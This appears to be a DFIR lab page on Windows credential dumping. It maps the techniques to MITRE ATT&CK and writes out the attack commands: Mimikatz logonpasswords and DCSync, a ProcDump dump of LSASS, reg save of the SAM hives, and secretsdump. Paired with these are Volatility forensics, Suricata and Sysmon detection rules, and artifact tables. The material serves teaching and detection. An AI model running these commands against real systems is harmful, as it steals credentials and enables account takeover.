# Attack Scenario: Credential Dumping

## MITRE ATT&CK Mapping

| Tactic              | Technique                                     | ID         |
|---------------------|-----------------------------------------------|------------|
| Credential Access   | OS Credential Dumping: LSASS Memory           | T1003.001  |
| Credential Access   | OS Credential Dumping: Security Account Mgr   | T1003.002  |
| Credential Access   | OS Credential Dumping: NTDS                   | T1003.003  |
| Privilege Escalation| Valid Accounts: Domain Accounts               | T1078.002  |

---

## Scenario 1: LSASS Process Dump (Mimikatz)

```powershell
# Requires SeDebugPrivilege (local admin)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest        # WDigest (older Windows)
mimikatz # lsadump::sam             # SAM database
```

### Task Manager / ProcDump method (signed binary abuse)
```cmd
# Using legitimate ProcDump (LOLBin)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

---

## Scenario 2: SAM + SYSTEM Hive Extraction

```cmd
reg save HKLM\SAM C:\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Temp\system.hiv
reg save HKLM\SECURITY C:\Temp\security.hiv
```

```bash
# On attacker — extract hashes offline
secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL
```

---

## Scenario 3: DCSync (Domain Controller Replication)

```powershell
# Requires Domain Admin or replication rights
mimikatz # lsadump::dcsync /domain:dfir.lab /all /csv
```

---

## Volatility3 Memory Analysis (Forensics)

```bash
# Find lsass.exe PID
vol3 -f /datasets/memory-dumps/victim.raw windows.pslist | grep lsass

# Dump lsass memory from image
vol3 -f /datasets/memory-dumps/victim.raw windows.memmap \
  --pid 628 --dump

# Find injected code in lsass
vol3 -f /datasets/memory-dumps/victim.raw windows.malfind \
  --pid 628

# Extract cached credentials (Mimikatz plugin)
vol3 -f /datasets/memory-dumps/victim.raw windows.cachedump
```

---

## Detection Rules

### Suricata — ProcDump signature
```
alert tcp any any -> $HOME_NET any (msg:"ET POLICY ProcDump LSASS Dump"; \
  content:"lsass"; nocase; sid:9000010;)
```

### Sysmon Event ID 10 — LSASS Access
```xml
<RuleGroup name="LSASS Access" groupRelation="or">
  <ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
    <GrantedAccess condition="contains">0x1010</GrantedAccess>
  </ProcessAccess>
</RuleGroup>
```

### Velociraptor Hunt
```sql
SELECT * FROM artifact_results(
  artifact='Windows.Detection.CredentialDumping')
WHERE Technique =~ 'LSASS'
```

---

## Forensic Timeline Artifacts

| Artifact                | Location                                      |
|------------------------|-----------------------------------------------|
| LSASS crash dumps      | `%SystemRoot%\Minidump\`                      |
| Prefetch                | `C:\Windows\Prefetch\PROCDUMP*`               |
| Shimcache              | Registry: `SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` |
| Event ID 4656/4663     | Security.evtx — SAM handle request            |
